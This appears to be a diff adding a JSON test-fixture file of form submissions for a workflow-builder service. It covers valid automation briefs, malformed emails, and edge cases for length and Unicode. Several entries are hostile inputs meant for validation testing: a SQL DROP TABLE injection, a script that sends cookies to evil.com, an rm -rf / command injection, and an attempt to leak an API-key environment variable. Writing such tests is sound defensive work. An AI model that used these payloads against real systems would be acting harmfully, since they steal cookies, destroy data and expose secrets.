@@ -1,0 +1,74 @@
+{
+  "valid_form_submission": {
+    "Client Brief": "I need a workflow that monitors my Google Sheets for new rows and sends a Slack notification with the row data to our team channel. The sheet tracks customer support tickets.",
+    "Your Email": "product@company.com"
+  },
+  "complex_form_submission": {
+    "Client Brief": "Build an automated lead qualification workflow:\n\n1. Trigger: New lead form submission on website\n2. Enrich lead data using Clearbit API\n3. Score lead based on company size, industry, job title\n4. If score > 70: Create deal in HubSpot, assign to sales rep, send Slack alert\n5. If score 40-70: Add to nurture campaign in ActiveCampaign\n6. If score < 40: Archive in Airtable for future reference\n\nAdditional requirements:\n- Error handling for API failures\n- Duplicate detection\n- Logging to PostgreSQL database",
+    "Your Email": "sales-ops@saas-company.com"
+  },
+  "empty_brief": {
+    "Client Brief": "",
+    "Your Email": "test@example.com"
+  },
+  "whitespace_brief": {
+    "Client Brief": "   \n\n   \t\t   ",
+    "Your Email": "test@example.com"
+  },
+  "invalid_email": {
+    "Client Brief": "Create a simple workflow for data backup",
+    "Your Email": "not-an-email"
+  },
+  "missing_at_email": {
+    "Client Brief": "Create a simple workflow for data backup",
+    "Your Email": "testexample.com"
+  },
+  "missing_domain": {
+    "Client Brief": "Create a simple workflow for data backup",
+    "Your Email": "test@"
+  },
+  "sql_injection_attempt": {
+    "Client Brief": "'; DROP TABLE workflows; --",
+    "Your Email": "hacker@example.com"
+  },
+  "xss_injection_attempt": {
+    "Client Brief": "<script>fetch('https://evil.com/steal?cookie='+document.cookie)</script>",
+    "Your Email": "hacker@evil.com"
+  },
+  "command_injection_attempt": {
+    "Client Brief": "Create workflow; rm -rf /; echo 'pwned'",
+    "Your Email": "malicious@attacker.com"
+  },
+  "environment_variable_leak_attempt": {
+    "Client Brief": "I need ${process.env.GEMINI_API_KEY} and ${$env.GEMINI_API_KEY} in my workflow",
+    "Your Email": "spy@competitor.com"
+  },
+  "very_long_email": {
+    "Client Brief": "Create a simple workflow",
+    "Your Email": "a".repeat(100) + "@" + "b".repeat(100) + ".com"
+  },
+  "unicode_email": {
+    "Client Brief": "International workflow with Unicode support",
+    "Your Email": "user@тест.com"
+  },
+  "special_chars_brief": {
+    "Client Brief": "Workflow with special chars: !@#$%^&*()_+-=[]{}|;':\",./<>?`~\n\nMúltïplé lîñés\n\nÉmøjîs: 🚀 💡 ✨",
+    "Your Email": "special@chars.com"
+  },
+  "max_length_brief": {
+    "Client Brief": "A".repeat(10000) + " This is a very long brief that tests the maximum length handling of the workflow builder system.",
+    "Your Email": "longbrief@test.com"
+  },
+  "minimal_valid": {
+    "Client Brief": "Create workflow to sync data",
+    "Your Email": "a@b.co"
+  },
+  "realistic_hubspot_asana": {
+    "Client Brief": "When a HubSpot deal is marked as 'Closed Won', automatically:\n- Create an Asana project in the 'Client Onboarding' workspace\n- Set project name as 'Onboarding: [Company Name]'\n- Add custom fields: Deal Value, Close Date, Account Owner\n- Create initial tasks: Kickoff Call, Requirements Gathering, Setup, Training\n- Assign to the onboarding team lead\n- Send Slack notification to #new-clients channel",
+    "Your Email": "ops@agency.com"
+  },
+  "realistic_stripe_automation": {
+    "Client Brief": "Automate our customer onboarding when Stripe subscription is created:\n1. Add customer to Airtable CRM with subscription details\n2. Create user account in our app via API\n3. Send welcome email sequence via SendGrid\n4. Add to Intercom for customer success tracking\n5. Post to Slack #new-customers channel\n6. Schedule first check-in call in Calendly",
+    "Your Email": "growth@startup.io"
+  }
+}
